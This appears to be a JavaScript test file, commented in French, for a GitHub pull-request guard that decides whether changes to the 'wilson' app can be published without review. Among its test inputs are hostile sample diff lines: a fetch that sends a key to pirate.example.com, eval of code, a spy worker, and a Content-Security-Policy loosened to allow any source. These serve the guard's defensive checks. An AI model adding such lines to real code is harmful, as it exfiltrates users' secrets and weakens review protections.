// Le gardien de la publication automatique (.github/gardien.mjs, PLAN.md section 11, S9, 15/11/26).
import { examiner } from '../.github/gardien.mjs';
let ok = 0, ko = 0; const t = (c, m) => { if (c) ok++; else { ko++; console.log('ÉCHEC : ' + m); } };
const D = 'timduneau-hue/wilson';
const pr = (x = {}) => ({ state: 'open', draft: false, user: { login: 'timduneau-hue' }, base: { ref: 'main' }, head: { repo: { full_name: D }, sha: 'abc' }, ...x });
const f = (filename, patch, x = {}) => ({ filename, patch, additions: (patch || '').split('\n').filter((l) => l.startsWith('+')).length, status: 'modified', ...x });

// Une correction ordinaire (comme celle de la télé, 1.43.3) : publiée seule.
const bump = "@@ -1,3 +1,3 @@\n-const VERSION = 'wilson-1.43.2';\n+const VERSION = 'wilson-1.43.3';\n const SHELL = [";
const ordinaire = [f('js/maison.js', "@@ -1 +1,2 @@\n+  injoignable(e) { return `${e.nom} ne répond pas`; }\n+  // voir https://abc.ts.net/api/states"), f('sw.js', bump),
  f('version.json', '@@ -1 +1 @@\n-{"version":"1.43.2"}\n+{"version":"1.43.3"}'), f('tests/maison_unit.mjs', '@@ -1 +1 @@\n+const u = "https://ha.exemple.ts.net";')];
let r = examiner(pr(), ordinaire, D);
t(r.length === 0, 'correction ordinaire : publiée seule : ' + r.join(' | '));
// Zones protégées : le merge de Timothée reste obligatoire.
for (const n of ['.github/workflows/publication.yml', '.github/gardien.mjs', 'pc/relais.mjs', 'apps-script/journal.gs', 'android/app/build.gradle', 'vendor/x.js', 'js/vision-worker.js'])
  t(examiner(pr(), [f(n, '@@ -1 +1 @@\n+x')], D).some((x) => x.includes('zone protégée')), 'zone protégée : ' + n);
t(examiner(pr(), [f('js/nouveau.js', '@@ -0,0 +1 @@\n+x', { previous_filename: 'pc/relais.mjs', status: 'renamed' })], D).length > 0, 'fichier déplacé hors de pc/ : refusé');
// Le verrou réseau ne bouge pas tout seul.
t(examiner(pr(), [f('index.html', "@@ -6 +6 @@\n-<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'\">\n+<meta http-equiv=\"Content-Security-Policy\" content=\"default-src *\">")], D).some((x) => /verrou réseau/.test(x)), 'CSP modifiée : refusée');
t(examiner(pr(), [f('index.html', '@@ -6 +5 @@\n-<meta http-equiv="Content-Security-Policy" content="x">')], D).some((x) => /verrou/.test(x)), 'CSP retirée : refusée');
// Adresses et code dangereux.
t(examiner(pr(), [f('js/app.js', "@@ -1 +1 @@\n+fetch('https://pirate.example.com/vol?d=' + cle);")], D).some((x) => /pirate\.example\.com/.test(x)), 'nouvelle adresse Internet : refusée');
t(examiner(pr(), [f('js/app.js', '@@ -1 +1 @@\n+const r = eval(code);')], D).some((x) => /eval/.test(x)), 'eval : refusé');
t(examiner(pr(), [f('js/app.js', "@@ -1 +1 @@\n+new Worker(new URL('./espion.js', import.meta.url));")], D).some((x) => /worker/.test(x)), 'nouveau worker : refusé');
t(examiner(pr(), [f('sw.js', "@@ -50 +50 @@\n-self.addEventListener('fetch', (e) => {});\n+self.addEventListener('fetch', (e) => fetch('https://x.y'));")], D).some((x) => /sw\.js/.test(x)), 'sw.js changé ailleurs que la version : refusé');
t(examiner(pr(), [f('espion.html', '@@ -0,0 +1 @@\n+<p>x</p>', { status: 'added' })], D).some((x) => /nouvelle page/.test(x)), 'nouvelle page html : refusée');
t(examiner(pr(), [f('js/app.js', null)], D).some((x) => /indisponible/.test(x)), 'détail indisponible (fichier énorme) : refusé');
t(examiner(pr(), [f('js/app.js', '@@ -1 +1 @@\n' + '+x\n'.repeat(2100))], D).some((x) => /lignes ajoutées/.test(x)), 'trop gros : refusé');
// Qui ouvre la demande.
t(examiner(pr({ head: { repo: { full_name: 'pirate/wilson' }, sha: 'abc' } }), ordinaire, D).some((x) => /ce dépôt/.test(x)), 'demande venue d\'une copie (fork) : refusée');
t(examiner(pr({ user: { login: 'pirate' } }), ordinaire, D).some((x) => /ouverte par/.test(x)), 'demande d\'un autre compte : refusée');
t(examiner(pr({ draft: true }), ordinaire, D).length > 0, 'brouillon : refusé');
t(examiner(pr({ base: { ref: 'autre' } }), ordinaire, D).length > 0, 'vers une autre branche que main : refusée');
console.log(`${ok}/${ok + ko} vérifications OK`); process.exit(ko ? 1 : 0);
